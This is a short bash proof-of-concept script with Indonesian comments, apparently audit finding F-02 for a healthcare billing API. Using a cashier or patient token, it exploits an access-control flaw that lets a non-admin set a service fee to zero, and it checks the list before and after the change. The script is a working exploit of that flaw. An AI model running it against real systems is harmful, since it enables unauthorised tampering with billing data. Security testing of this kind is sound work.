#!/usr/bin/env bash
# PoC F-02: IDOR perubahan tarif layanan oleh role kasir/pasien.
# Butuh token non-admin: TOKEN=<jwt kasir> BASE=http://localhost:3000 ./04_idor_fee.sh
set -euo pipefail
BASE="${BASE:-http://localhost:3000}"
TOKEN="${TOKEN:?set TOKEN ke JWT role cashier/patient}"

echo "=== tarif sebelum ==="
curl -s "$BASE/api/services" -H "Authorization: Bearer $TOKEN" | head -c 300; echo

echo "=== ubah tarif layanan id=1 menjadi 0 ==="
curl -s -X POST "$BASE/api/services/fee" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"id":1,"fee":0}'
echo

echo "=== verifikasi perubahan ==="
curl -s "$BASE/api/services" -H "Authorization: Bearer $TOKEN" | head -c 300; echo
